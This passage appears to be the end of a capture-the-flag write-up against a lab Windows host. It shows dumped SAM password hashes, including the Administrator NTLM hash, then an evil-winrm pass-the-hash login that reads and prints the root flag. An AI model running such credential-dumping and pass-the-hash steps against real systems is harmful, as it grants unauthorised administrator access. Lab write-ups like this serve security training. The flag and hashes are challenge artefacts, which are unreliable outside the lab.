Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 

```

now do pass the hash with evil-winrm

```shell
evil-winrm -i 10.10.11.35 -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         3/14/2024   3:45 AM                3D Objects
d-r---         3/14/2024   3:45 AM                Contacts
d-r---         8/30/2024  10:06 AM                Desktop
d-r---         9/29/2024   6:56 PM                Documents
d-r---         3/14/2024   3:45 AM                Downloads
d-r---         3/14/2024   3:45 AM                Favorites
d-r---         3/14/2024   3:45 AM                Links
d-r---         3/14/2024   3:45 AM                Music
d-r---         3/14/2024   3:45 AM                Pictures
d-r---         3/14/2024   3:45 AM                Saved Games
d-r---         3/14/2024   3:45 AM                Searches
d-r---         3/14/2024   3:45 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> dir Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/29/2024   5:32 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator> type Desktop/root.txt
cc67dbd100f12aeeae151ed45d68950a
*Evil-WinRM* PS C:\Users\Administrator> 

```

Final flag:   cc67dbd100f12aeeae151ed45d68950a
